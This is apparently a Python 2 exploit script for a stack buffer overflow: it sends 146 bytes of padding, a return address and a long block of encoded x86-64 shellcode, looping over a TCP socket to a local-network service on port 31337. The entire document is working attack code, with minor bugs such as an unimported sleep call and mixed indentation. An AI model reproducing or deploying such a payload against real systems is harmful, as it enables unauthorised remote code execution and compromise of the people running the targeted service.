#!/usr/bin/python
import sys, socket

#080414c3

overflow = ("\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\x3d\xd4\x7b\xbc\x90\x04\xc4\x0e\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\xc1\x9c\xf8\x58\x60\xec"
"\x04\x0e\x3d\xd4\x3a\xed\xd1\x54\x96\x5f\x6b\x9c\x4a\x6e\xf5"
"\x4c\x4f\x5c\x5d\x9c\xf0\xee\x88\x4c\x4f\x5c\x1d\x9c\xf0\xce"
"\xc0\x4c\xcb\xb9\x77\x9e\x36\x8d\x59\x4c\xf5\xce\x91\xe8\x1a"
"\xc0\x92\x28\xe4\x4f\xfc\x1d\x76\xfd\x91\xc5\x26\xe3\x6f\x95"
"\x2a\xf4\x1b\x56\xe4\x85\x7f\xe8\x33\xbd\x40\x8f\x44\x86\x3d"
"\xd4\x7b\xf4\x15\xc4\xb0\x69\x75\xd5\xab\xec\x1b\x4c\xdc\x4a"
"\xb6\x94\x5b\xf5\x91\xd4\x27\x58\x75\x2b\xb2\xfd\x1b\x30\x4c"
"\x46\x3c\x02\x36\x8d\x59\x4c\xf5\xce\x91\x95\xba\x75\x9d\x45"
"\xc5\xcf\x05\x34\x0e\x4d\xdc\x07\x88\x2a\x35\x91\x42\x6d\xe5"
"\xdc\x9c\x4a\xb6\x94\x5f\xf5\x91\xd4\xa2\x4f\xb6\xd8\x33\xf8"
"\x1b\x44\xd8\x47\x3c\x04\x3a\x37\x94\x8c\x8c\x0f\xed\x95\x23"
"\xfd\xc8\x5a\x9d\x54\x7c\x8c\x3a\xe5\xd1\x5e\x8c\x8d\xd1\xf4"
"\x3a\xee\x6f\xe4\x9c\x4f\x64\x8e\x33\x37\x82\xed\x93\xf1\xc2"
"\x2b\x26\xf5\x2e\x73\xb7\x3c\x62\xe7\x49\xbc\x90\x45\x92\x47"
"\xb4\x32\x33\x3d\x7c\xa4\xc5\x0e\x3d\x9d\xf2\x59\xd9\xb8\xc6"
"\x0e\x2c\x88\xbb\x14\x90\x6c\x85\x5a\x74\x5d\x9f\xf0\x19\xf5"
"\x85\xb4\x71\xa3\x5d\xbb\x6f\xd1\x88\x87\xd7\xbc\x7a\xbd\x90"
"\x04\x9d\x4f\x87\xfd\xfb\xd7\x90\xfb\x11\x5e\x6d\x99\x4a\x75"
"\xdd\x35\x04\x46\xc2\x14\x33\x35\x52\x4c\x3b\xce\x75\x5d\xba"
"\xfd\x2a\xee\xcb\xd1\xdd\x2b\xae\xf4\x19\xc3\xae\x1e\x7c\x8c"
"\x37\x35\x72\x4c\x4d\xf7\x7c\x6e\xe2\x19\xe4\x65\x3b\xdb\x75"
"\x55\xbf\xfc\x92\x04\xc4\x47\x85\xb7\x16\xd8\x90\x04\xc4\x0e"
"\x3d\x95\x2b\xfd\xc0\x4c\x4d\xec\x6a\x83\x2c\xf1\xa1\xc4\xae"
"\x03\x64\x95\x2b\x5e\x6c\x62\x03\x4a\x19\x80\x7a\xbd\xd8\x89"
"\x80\x2a\x25\x12\x7b\xd4\xd8\x8d\x22\x58\x6d\x95\x2b\xfd\xc0"
"\x45\x94\x47\xc2\x14\x3a\xec\xd9\xfb\x0c\x43\xb4\x15\x37\x35"
"\x51\x45\x7e\x77\xf1\xeb\xfd\x43\x45\x4c\xf5\xdc\x75\x2b\xb1"
"\x37\x9e\x45\x7e\x06\xba\xc9\x1b\x43\x45\xbf\x34\xbb\x9f\x82"
"\x3a\x06\x36\x91\x79\x93\xc2\x01\x33\x3f\x54\x2c\xf8\x08\x41"
"\xde\xfb\x47\x70\x71\xc1\xb5\x7a\xc7\x09\xd3\xfa\x04\x9d\x4f"
"\xb4\x0e\x84\x69\x90\x04\xc4\x0e")

shellcode = "A" * 146 + "\xc3\x14\x04\x08" + overflow

while True:
        try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect(('192.168.0.149',31337))

                s.send((shellcode + '\n'))
                s.close()
                sleep(1)

        except:
                print "error connecting to server"
                sys.exit()
